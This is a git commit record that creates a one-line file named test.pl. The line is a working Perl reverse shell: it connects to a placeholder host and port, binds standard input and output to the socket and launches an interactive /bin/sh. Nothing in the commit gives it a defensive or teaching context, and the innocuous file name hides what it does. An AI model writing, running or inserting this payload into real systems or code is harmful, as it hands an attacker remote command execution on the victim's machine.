cf66781c95fb324bff76b4e178fdf02f8488fc48
grab0X1 <30288701+grab0X1@users.noreply.github.com>
2018-02-10 02:46:06 +0530

    Create test.pl

---
+++ test.pl
@@ -0,0 +1,1 @@
+use Socket;$i="MY_CONNECTBACK_IP";$p=MY_CONNECTBACK_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
